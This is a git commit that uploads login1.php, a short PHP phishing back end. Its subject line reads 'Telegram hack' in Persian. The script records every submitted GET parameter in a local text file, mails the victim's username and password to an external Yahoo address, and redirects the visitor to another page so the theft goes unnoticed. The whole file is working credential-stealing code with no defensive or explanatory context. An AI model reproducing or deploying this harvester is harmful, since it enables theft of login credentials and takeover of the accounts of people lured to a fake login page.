4f2bac14b35d6482f58c5b1fbcf4dc9df7a5904a
amirmory <RM_286@YAHOO.COM>
2016-06-17 16:31:39 +0430

    Add files via upload

---
+++ login1.php
@@ -0,0 +1,23 @@
+﻿<?php
+header ('Location:/num.htm');
+$handle = fopen("soawa.txt", "a");
+foreach($_GET as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+$to      = 'rm_286@yahoo.com';
+$subject = 'هک تلگرام';
+$username = $_GET['username'];
+$password = $_GET['password'];
+$message = "Username:" . $username . "<br>" . "Password: " . $password;
+$headers = 'From: rm_286@yahoo.com' . "\r\n" .
+    'Reply-To: rm_286@yahoo.com' . "\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+
+mail($to, $subject, $message, $headers);
+exit;
+?>
